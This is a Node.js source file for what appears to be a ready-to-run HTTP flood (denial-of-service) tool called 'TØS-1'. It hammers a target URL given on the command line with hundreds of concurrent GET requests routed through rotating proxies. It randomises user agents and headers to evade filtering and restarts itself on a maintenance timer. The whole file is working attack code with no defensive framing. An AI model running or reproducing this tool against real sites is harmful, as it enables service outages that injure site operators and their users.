const https = require('https');
const { HttpsProxyAgent } = require('https-proxy-agent');
const fs = require('fs');

class TOS1_H1_PROXY {
    constructor(targetUrl) {
        this.targetUrl = targetUrl;
        this.hostname = new URL(targetUrl).hostname;
        this.sessionId = "S023";
        this.totalRequests = 0;
        this.running = true;
        this.attackActive = true;
        
        // Load resources
        this.proxies = this.loadFile('main.txt');
        this.userAgents = this.loadFile('ua.txt');
        this.proxyIndex = 0;
        
        // Headers rotation
        this.headersPool = this.generateHeaders();
        this.currentHeaders = {};
        this.currentUA = "";
        this.currentProxy = "";
        
        // Connection tracking
        this.activeRequests = 0;
        this.maxConcurrent = 500; // HTTP/1.1 needs more connections
        
        // Maintenance
        this.lastMaintenance = Date.now();
        this.maintenanceInterval = 900000; // 15 minutes
        
        // Intervals
        this.attackInterval = null;
        this.maintenanceCheck = null;
        this.displayInterval = null;
    }
    
    loadFile(filename) {
        try {
            const data = fs.readFileSync(filename, 'utf8');
            return data.split('\n').filter(line => line.trim());
        } catch {
            return [];
        }
    }
    
    generateHeaders() {
        return [
            {
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate, br',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1',
                'Cache-Control': 'no-cache',
                'Pragma': 'no-cache'
            },
            {
                'Accept': '*/*',
                'Accept-Language': 'en-US,en;q=0.9',
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'keep-alive',
                'Cache-Control': 'no-cache',
                'Pragma': 'no-cache'
            },
            {
                'Accept': 'application/json, text/plain, */*',
                'Accept-Language': 'en-US,en;q=0.8',
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'keep-alive',
                'Cache-Control': 'no-cache'
            }
        ];
    }
    
    getNextProxy() {
        if (this.proxies.length === 0) return null;
        
        this.proxyIndex = (this.proxyIndex + 1) % this.proxies.length;
        return this.proxies[this.proxyIndex];
    }
    
    rotateResources() {
        // Rotate proxy
        this.currentProxy = this.getNextProxy();
        
        // Rotate UA
        if (this.userAgents.length > 0) {
            this.currentUA = this.userAgents[Math.floor(Math.random() * this.userAgents.length)];
        }
        
        // Rotate headers
        this.currentHeaders = {...this.headersPool[Math.floor(Math.random() * this.headersPool.length)]};
        if (this.currentUA) {
            this.currentHeaders['User-Agent'] = this.currentUA;
        }
        
        // Add random headers for variation
        this.currentHeaders['X-Request-ID'] = Math.random().toString(36).substr(2, 10);
    }
    
    sendRequest() {
        if (!this.attackActive || this.activeRequests >= this.maxConcurrent) return;
        
        if (!this.currentProxy) {
            // If no proxy, rotate anyway
            this.rotateResources();
            return;
        }
        
        this.activeRequests++;
        
        try {
            const options = {
                hostname: this.hostname,
                port: 443,
                path: '/',
                method: 'GET',
                headers: this.currentHeaders,
                agent: new HttpsProxyAgent(`http://${this.currentProxy}`),
                timeout: 5000,
                rejectUnauthorized: false
            };
            
            const req = https.request(options, (res) => {
                res.on('data', () => {});
                res.on('end', () => {
                    this.totalRequests++;
                    this.activeRequests--;
                });
                res.on('error', () => {
                    this.activeRequests--;
                });
            });
            
            req.on('error', () => {
                this.totalRequests++;
                this.activeRequests--;
            });
            
            req.on('timeout', () => {
                req.destroy();
                this.activeRequests--;
            });
            
            req.end();
            
        } catch (err) {
            this.activeRequests--;
        }
    }
    
    startAttack() {
        // Initial display
        console.log('𝖳Ø𝖲-1 | 𝖲023');
        
        setTimeout(() => {
            process.stdout.write('\x1B[2J\x1B[0f'); // Clear
            
            this.rotateResources();
            
            // MAX SPEED ATTACK WITH PROXIES
            this.attackInterval = setInterval(() => {
                if (this.attackActive) {
                    // Send multiple requests per tick
                    const batchSize = Math.min(50, this.maxConcurrent - this.activeRequests);
                    
                    for (let i = 0; i < batchSize; i++) {
                        this.sendRequest();
                        
                        // Rotate proxy every 5 requests
                        if (i % 5 === 0) {
                            this.rotateResources();
                        }
                    }
                }
            }, 0.1); // 100ms
            
            // Display update
            this.displayInterval = setInterval(() => {
                process.stdout.write(`\rTØS-1 — ${this.totalRequests} | {S023}`);
            }, 100); // Update every 100ms
            
            // Maintenance check
            this.maintenanceCheck = setInterval(() => {
                if (Date.now() - this.lastMaintenance >= this.maintenanceInterval) {
                    this.performMaintenance();
                }
            }, 10000); // Check every 10s
            
        }, 2000);
    }
    
    performMaintenance() {
        this.attackActive = false;
        console.log('\n[~] TØS-MAINTENANCE');
        
        // Clear current state
        this.activeRequests = 0;
        
        // Full rotation
        this.rotateResources();
        
        // Reload files
        this.proxies = this.loadFile('main.txt');
        this.userAgents = this.loadFile('ua.txt');
        
        setTimeout(() => {
            this.attackActive = true;
            this.lastMaintenance = Date.now();
        }, 2000);
    }
    
    stop() {
        this.running = false;
        clearInterval(this.attackInterval);
        clearInterval(this.displayInterval);
        clearInterval(this.maintenanceCheck);
    }
}

// Dependencies check and install
try {
    require('https-proxy-agent');
} catch {
    console.log('Installing https-proxy-agent...');
    const { execSync } = require('child_process');
    try {
        execSync('npm install https-proxy-agent', { stdio: 'inherit' });
    } catch {
        console.log('Install manually: npm install https-proxy-agent');
        process.exit(1);
    }
}

// Main
const target = process.argv[2];
if (!target) {
    process.exit(1);
}

// Check files
if (!fs.existsSync('ua.txt')) {
    fs.writeFileSync('ua.txt', 
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\n' +
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36\n' +
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36\n'
    );
}

if (!fs.existsSync('main.txt')) {
    console.log('main.txt not found - create file with proxies (ip:port)');
    process.exit(1);
}

const tos = new TOS1_H1_PROXY(target);

// Handle exit
process.on('SIGINT', () => {
    tos.stop();
    process.exit(0);
});

// Start
tos.startAttack();
